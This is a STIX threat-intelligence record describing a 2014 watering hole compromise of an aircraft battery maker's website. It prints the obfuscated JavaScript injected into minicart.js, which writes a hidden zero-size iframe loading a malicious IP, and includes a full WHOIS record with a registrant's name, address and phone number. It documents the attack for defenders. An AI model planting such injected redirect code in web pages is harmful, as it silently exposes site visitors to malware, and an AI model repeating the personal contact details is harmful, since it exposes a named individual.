stix:STIX_Header.stix:Title: Watering Hole Activity on Aircraft Battery Website
stix:STIX_Header.stix:Description: On 24 October 2014, watering hole activity was reported on an aircraft battery manufacturing company's website. Malicious code was reported as being in the bottom of /scripts/minicart.js function which is referenced by many of the pages.

stix:Indicator.indicator:Description:
As of 24 October 2014, the malicious JS code pointed to 178.79.186.55/jquery.php and is returning an HTTP 404 error.
The following is a sample of the embedded malicious redirect code:
----- Begin Code Snippet -----
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6.7("<1 8=\\"5://2.3.4.c/d/e.9\\" a=0 b=0></1>");',15,15,'|iframe|178|79|186|http|document|write|src|php|width|height|55|js|Jquery'.split('|'),0,{}))
----- End Code Snippet -----
As of 30 September 2014 178.79.186.55 resolved to mxn3.nwave.in (A record).
According to a WHOIS search on http://whois.domaintools.com:
The domain is registered, along with 40 other domains, to the email address Kalyan.Manyamis@gmail.com.
ASN AS15830 TELECITY-LON TELECITYGROUP INTERNATIONAL LIMITED,GB (registered Oct 20, 2000)
The IP is hosted by a dedicated server of the VPN hosting service Linode Llc, London,UK.
Domain ID:D6762396-AFIN Domain Name:NWAVE.IN Created On:19-Sep-2012 11:54:17 UTC Last Updated On:29-Sep-2014 10:41:47 UTC Expiration Date:19-Sep-2015 11:54:17 UTC Sponsoring Registrar:Wild West Domains, LLC (R102-AFIN) Status:CLIENT DELETE PROHIBITED Status:CLIENT RENEW PROHIBITED Status:CLIENT TRANSFER PROHIBITED Status:CLIENT UPDATE PROHIBITED Status:AUTORENEWPERIOD Registrant ID:CR124286930 Registrant Name:Kalyan Manyam Registrant Organization: Registrant Street1:C 1903, Ramky Towers Registrant Street2:Gachibowli Registrant Street3: Registrant City:Hyderabad Registrant State/Province:Andhra Pradesh Registrant Postal Code:500032 Registrant Country:IN Registrant Phone:+91.9866620282 Registrant Phone Ext.: Registrant FAX: Registrant FAX Ext.: Registrant Email: Admin ID:CR124286932 Admin Name:Kalyan Manyam Admin Organization: Admin Street1:C 1903, Ramky Towers Admin Street2:Gachibowli Admin Street3: Admin City:Hyderabad Admin State/Province:Andhra Pradesh Admin Postal Code:500032 Admin Country:IN Admin Phone:+91.9866620282 Admin Phone Ext.: Admin FAX: Admin FAX Ext.: Admin Email: Tech ID:CR124286931 Tech Name:Kalyan Manyam Tech Organization: Tech Street1:C 1903, Ramky Towers Tech Street2:Gachibowli Tech Street3: Tech City:Hyderabad Tech State/Province:Andhra Pradesh Tech Postal Code:500032 Tech Country:IN Tech Phone:+91.9866620282 Tech Phone Ext.: Tech FAX: Tech FAX Ext.: Tech Email: Name Server:NS10.DNSMADEEASY.COM Name Server:NS11.DNSMADEEASY.COM Name Server:NS12.DNSMADEEASY.COM Name Server:NS13.DNSMADEEASY.COM Name Server:NS14.DNSMADEEASY.COM Name Server:NS15.DNSMADEEASY.COM Name Server: Name Server: Name Server: Name Server: Name Server: Name Server: Name Server: DNSSEC:Unsigned

As of 24 October 2014 the malicious JS code was seen redirecting to http://106.187.98.115/jquery/jquery.min.php before changing to pointing to http://178.79.186.55/jquery.php
The following is a sample of the embedded malicious redirect code:
----- Begin Code Snippet -----
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6.7("<1 8=\\"5://2.3.4.c/d/e.9\\" a=0 b=0></1>");',15,15,'|iframe|178|79|186|http|document|write|src|php|width|height|55|js|Jquery'.split('|'),0,{}))
